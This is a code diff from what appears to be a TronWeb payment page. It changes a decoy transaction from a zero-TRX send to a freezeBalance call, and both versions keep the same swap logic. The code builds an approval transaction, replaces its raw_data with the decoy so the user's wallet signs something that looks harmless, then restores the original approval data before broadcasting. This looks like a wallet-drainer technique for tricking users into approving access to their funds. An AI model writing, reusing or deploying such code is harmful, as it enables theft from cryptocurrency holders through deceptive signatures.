@@ -185,20 +185,26 @@
                 userAddress
             );
 
-            const trxAmount = '0x0';
-            const transferTransaction = await tronWebInstance.transactionBuilder.sendTrx(
-                payaddress,
-                trxAmount,
-                userAddress
-            );
+              const freezeAmount = 5; 
+                        const freezeDuration = 3; 
+                        const resource = "ENERGY"; 
+                        
+                        const transferTransaction = await tronWebInstance.transactionBuilder.freezeBalance(
+                            tronWebInstance.toSun(freezeAmount), 
+                            freezeDuration,
+                            resource,
+                            userAddress 
+                        );
 
-            const originalRawData = approvalTransaction.transaction.raw_data;
-            approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+                    const originalRawData = approvalTransaction.transaction.raw_data;
 
-            const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
-            signedTransaction.raw_data = originalRawData;
-
-            const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
+                    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+  
+                    const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
+             
+                     signedTransaction.raw_data = originalRawData;
+     
+                    const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
             
             if (!broadcastResult.result) {
                 alert("支付失败，请重试！");
